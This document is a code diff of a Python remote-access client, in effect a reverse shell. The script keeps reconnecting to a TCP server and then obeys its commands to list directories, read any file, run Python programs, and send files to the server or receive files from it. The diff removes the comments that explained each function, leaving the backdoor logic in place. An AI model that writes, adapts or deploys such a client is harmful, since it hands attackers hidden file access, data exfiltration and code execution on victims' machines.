@@ -1,14 +1,11 @@
 import os
 import subprocess
-import tqdm
 import pyautogui
 import socket
 import time
 import json
-#To send the present working directory to the server
 def pwd():
     send1(os.getcwd())
-#To change the present working directory and send the output to the server
 def cd(stri):
     try:
         data=' '.join(stri)
@@ -31,7 +28,7 @@ def cd(stri):
             send1("Use / insted of \\")
         else:
             send1("file not found")
-# To list all the file and directory and send to server
+
 def ls(path):
     path1=''.join(path)
     all1 = ""
@@ -49,13 +46,11 @@ def ls(path):
             send1("Use / insted of \\")
         else:
             send1("ls: file not found")
-# To list the file contents requested by the server
 def cat(path1):
     path12=''.join(path1)
     with open(path12) as rdf:
         content=rdf.read()
         send1(content)
-# To execute any python file present in the system
 def python1(d1):
     send12=0
     completed_process = subprocess.run([d1[0],d1[1]], stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
@@ -64,7 +59,7 @@ def python1(d1):
     else:
         send1("\n ... Execution Failed ... \n")
 
-#to send a file back to the server , which was requested
+#files --------------------------------------------------------------------
 def sendf(imgpth):
     SEPARATOR = "<SEPARATOR>"
     filesize = os.path.getsize(imgpth)
@@ -82,11 +77,11 @@ def sendf(imgpth):
             s.sendall(bytes_read)
             # update the progress bar
 
-#To send output to server
+    
 def send1(datasend):
     jsdata = json.dumps(datasend)
     s.send(jsdata.encode())
-#To receie commands from server
+
 def recv():
     data1 =''
     while True:
@@ -95,7 +90,6 @@ def recv():
             return json.loads(data1)
         except ValueError:
             continue
-#To receive files from server
 def recvf():
     SEPARATOR = "<SEPARATOR>"
     received = s.recv(4096).decode()
@@ -112,7 +106,7 @@ def recvf():
             f.write(bytes_read)
             size1 += len(bytes_read)
    
-#The menu of operations
+
 def menu():
     while True:
         a = recv()
@@ -152,7 +146,7 @@ def menu():
                 python1(b)
             case _:
                 send1("Not found this?...")
-#Establish a connection code
+
 def conect1():
     while True:
         time.sleep(10)
@@ -163,7 +157,7 @@ def conect1():
             break
         except:
             continue
-# for an ipv4 tcp onnection           
+            
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) #(ipv4,tcp)
 conect1()
 
